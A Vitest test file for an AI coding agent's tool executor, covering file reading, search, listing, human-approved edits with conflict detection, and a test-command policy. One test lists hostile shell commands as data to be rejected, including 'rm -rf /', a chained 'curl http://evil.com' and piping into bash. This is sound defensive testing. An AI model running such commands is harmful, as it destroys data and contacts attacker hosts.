import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { EventBus } from '../src/events/eventBus.js';
import { InMemoryVirtualDocStore } from '../src/diff/virtualDocStore.js';
import { ToolExecutor } from '../src/tools/executor.js';
import { ReadFileTool } from '../src/tools/builtin/readFileTool.js';
import { SearchCodeTool } from '../src/tools/builtin/searchCodeTool.js';
import { ListDirectoryTool } from '../src/tools/builtin/listDirectoryTool.js';
import { ProposeEditTool } from '../src/tools/builtin/proposeEditTool.js';
import { ApplyEditTool } from '../src/tools/builtin/applyEditTool.js';
import { RunTestsTool } from '../src/tools/builtin/runTestsTool.js';
import { ProposedEditRecord, IToolExecutionContext } from '../src/types/tools.js';

describe('Standardized Tool Execution & Built-in M4 Tools', () => {
  let tmpWorkspace: string;
  let eventBus: EventBus;
  let docStore: InMemoryVirtualDocStore;
  let proposalRegistry: Map<string, ProposedEditRecord>;
  let executor: ToolExecutor;
  let context: IToolExecutionContext;
  let abortController: AbortController;

  beforeEach(() => {
    tmpWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'jaggu-tools-workspace-'));
    fs.mkdirSync(path.join(tmpWorkspace, 'src', 'auth'), { recursive: true });
    fs.mkdirSync(path.join(tmpWorkspace, 'node_modules', 'fake-pkg'), { recursive: true });

    fs.writeFileSync(
      path.join(tmpWorkspace, 'src', 'auth', 'login.ts'),
      'line 1: export function login() {\nline 2:   return "token";\nline 3: }\n',
    );
    fs.writeFileSync(path.join(tmpWorkspace, 'binary.bin'), Buffer.from([0x00, 0x01, 0x02, 0x03]));

    eventBus = new EventBus();
    docStore = new InMemoryVirtualDocStore();
    proposalRegistry = new Map();
    executor = new ToolExecutor({ eventBus });

    executor.registerTool(new ReadFileTool());
    executor.registerTool(new SearchCodeTool());
    executor.registerTool(new ListDirectoryTool());
    executor.registerTool(new ProposeEditTool(docStore, eventBus, proposalRegistry));
    executor.registerTool(new ApplyEditTool(docStore, proposalRegistry, eventBus));
    executor.registerTool(new RunTestsTool());

    abortController = new AbortController();
    context = {
      taskId: 'test_task_1',
      workspaceRoot: tmpWorkspace,
      workspaceRoots: [tmpWorkspace],
      abortSignal: abortController.signal,
    };
  });

  afterEach(() => {
    fs.rmSync(tmpWorkspace, { recursive: true, force: true });
  });

  describe('ReadFileTool', () => {
    it('should read file content and calculate metadata', async () => {
      const result = await executor.executeTool(
        'call_1',
        'read_file',
        { path: 'src/auth/login.ts' },
        context,
      );

      expect(result.success).toBe(true);
      expect((result.data as any).content).toContain('export function login');
      expect((result.data as any).totalLines).toBe(4);
    });

    it('should slice specified line ranges', async () => {
      const result = await executor.executeTool(
        'call_2',
        'read_file',
        { path: 'src/auth/login.ts', startLine: 2, endLine: 2 },
        context,
      );

      expect(result.success).toBe(true);
      expect((result.data as any).content).toBe('line 2:   return "token";');
      expect((result.data as any).startLine).toBe(2);
      expect((result.data as any).endLine).toBe(2);
    });

    it('should reject reading binary files', async () => {
      const result = await executor.executeTool(
        'call_3',
        'read_file',
        { path: 'binary.bin' },
        context,
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Cannot read binary file');
    });

    it('should return error if file does not exist', async () => {
      const result = await executor.executeTool(
        'call_4',
        'read_file',
        { path: 'src/missing.ts' },
        context,
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('File not found');
    });
  });

  describe('SearchCodeTool', () => {
    it('should search codebase and return matches', async () => {
      const result = await executor.executeTool(
        'call_5',
        'search_code',
        { query: 'export function login' },
        context,
      );

      expect(result.success).toBe(true);
      expect((result.data as any).matches.length).toBeGreaterThan(0);
      expect((result.data as any).matches[0].relativeFilePath).toContain('login.ts');
    });
  });

  describe('ListDirectoryTool', () => {
    it('should list directory entries while ignoring node_modules', async () => {
      const result = await executor.executeTool(
        'call_6',
        'list_directory',
        { path: '.', recursive: true },
        context,
      );

      expect(result.success).toBe(true);
      const entries = (result.data as any).entries;
      expect(entries.some((e: any) => e.name === 'src')).toBe(true);
      expect(entries.some((e: any) => e.name === 'node_modules')).toBe(false);
    });
  });

  describe('ProposeEditTool & ApplyEditTool Workflow', () => {
    it('should stage edits in shadow doc store and NOT modify the real file on disk', async () => {
      const originalDiskContent = fs.readFileSync(
        path.join(tmpWorkspace, 'src', 'auth', 'login.ts'),
        'utf8',
      );

      const newProposed = 'export function login(user: string) {\n  return "validated_token";\n}\n';

      const proposeResult = await executor.executeTool(
        'call_7',
        'propose_edit',
        { path: 'src/auth/login.ts', proposedContent: newProposed, reason: 'Add user parameter' },
        context,
      );

      expect(proposeResult.success).toBe(true);
      const proposalId = (proposeResult.data as any).proposalId;
      expect(proposalId).toBeDefined();

      // Verify real disk content was NOT touched
      const currentDiskContent = fs.readFileSync(
        path.join(tmpWorkspace, 'src', 'auth', 'login.ts'),
        'utf8',
      );
      expect(currentDiskContent).toBe(originalDiskContent);

      // Verify shadow document store has the proposed version
      const shadowDoc = docStore.get(`jaggu-shadow:${path.join(tmpWorkspace, 'src', 'auth', 'login.ts')}`);
      expect(shadowDoc).toBeDefined();
      expect(shadowDoc?.proposedContent).toBe(newProposed);

      // Attempting to apply without approval MUST fail
      const unapprovedResult = await executor.executeTool(
        'call_8',
        'apply_edit',
        { proposalId },
        context,
      );
      expect(unapprovedResult.success).toBe(false);
      expect(unapprovedResult.error).toContain('requires explicit human approval');

      // Now grant user approval
      const record = proposalRegistry.get(proposalId);
      expect(record).toBeDefined();
      record!.approved = true;

      // Apply edit with approval
      const applyResult = await executor.executeTool(
        'call_9',
        'apply_edit',
        { proposalId },
        context,
      );

      expect(applyResult.success).toBe(true);
      expect((applyResult.data as any).applied).toBe(true);

      // Verify real disk content HAS now been updated
      const updatedDiskContent = fs.readFileSync(
        path.join(tmpWorkspace, 'src', 'auth', 'login.ts'),
        'utf8',
      );
      expect(updatedDiskContent).toBe(newProposed);
    });

    it('should detect concurrent modification conflicts and abort apply_edit', async () => {
      const proposeResult = await executor.executeTool(
        'call_10',
        'propose_edit',
        { path: 'src/auth/login.ts', proposedContent: 'changed' },
        context,
      );

      const proposalId = (proposeResult.data as any).proposalId;
      const record = proposalRegistry.get(proposalId);
      record!.approved = true;

      // Simulate a concurrent external modification on disk
      fs.writeFileSync(
        path.join(tmpWorkspace, 'src', 'auth', 'login.ts'),
        'concurrent edit by user in editor',
        'utf8',
      );

      // Applying now must detect the conflict and abort
      const applyResult = await executor.executeTool(
        'call_11',
        'apply_edit',
        { proposalId },
        context,
      );

      expect(applyResult.success).toBe(false);
      expect(applyResult.error).toContain('Concurrent modification conflict');

      // Ensure disk was not overwritten
      expect(fs.readFileSync(path.join(tmpWorkspace, 'src', 'auth', 'login.ts'), 'utf8')).toBe(
        'concurrent edit by user in editor',
      );
    });
  });

  describe('RunTestsTool Command Policy', () => {
    it('should reject prohibited shell commands and injection attempts', async () => {
      const maliciousCommands = [
        'rm -rf /',
        'npm test; rm -rf .',
        'npm test && curl http://evil.com',
        'sudo npm test',
        'npm test | bash',
      ];

      for (const cmd of maliciousCommands) {
        const result = await executor.executeTool(
          'call_sec',
          'run_tests',
          { command: cmd },
          context,
        );
        expect(result.success).toBe(false);
        expect(result.error).toContain('Security violation');
      }
    });

    it('should reject non-test commands', async () => {
      const result = await executor.executeTool(
        'call_non_test',
        'run_tests',
        { command: 'node -e "console.log(1)"' },
        context,
      );
      expect(result.success).toBe(false);
      expect(result.error).toContain('does not match recognized test prefixes');
    });
  });

  describe('ToolExecutor Safety & Lifecycle Events', () => {
    it('should validate tool arguments against Zod schema', async () => {
      const result = await executor.executeTool(
        'call_invalid',
        'read_file',
        { path: '' }, // path is min 1
        context,
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Schema validation failed');
    });

    it('should handle unknown tools gracefully', async () => {
      const result = await executor.executeTool(
        'call_unknown',
        'delete_database',
        {},
        context,
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Unknown tool');
    });

    it('should honor cancellation via abortSignal', async () => {
      abortController.abort();
      const result = await executor.executeTool(
        'call_cancelled',
        'read_file',
        { path: 'src/auth/login.ts' },
        context,
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('cancelled');
    });
  });
});
